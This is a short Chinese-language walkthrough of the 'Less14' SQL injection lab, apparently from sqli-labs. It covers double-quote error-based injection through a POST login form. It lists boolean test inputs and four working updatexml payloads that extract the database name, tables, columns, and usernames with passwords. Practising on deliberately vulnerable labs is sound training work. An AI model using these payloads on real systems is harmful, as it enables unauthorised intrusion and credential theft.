# Less14 — POST 双引号报错注入

## 关键信息

| 项目 | 内容 |
|------|------|
| 类型 | POST |
| 闭合 | `"` |
| SQL | `WHERE username="$uname" and password="$passwd"` |
| 报错 | ✅ `print_r(mysql_error())` |
| 回显 | ❌（只显示 flag/slap 图片） |
| 注入方式 | 报错注入（UNION 无回显） |

## 判断是否存在注入

uname 注入，passwd 随便填：

```
uname=1" and 1=1 --+   → flag ✅
uname=1" and 1=2 --+   → slap ❌
```

## 报错注入 payload（Burp 里改 uname 值）

```
# 爆数据库名
uname=1" and updatexml(1,concat(0x7e,(select database())),1) --+

# 爆表名
uname=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+

# 爆字段
uname=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1) --+

# 爆数据
uname=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) --+
```
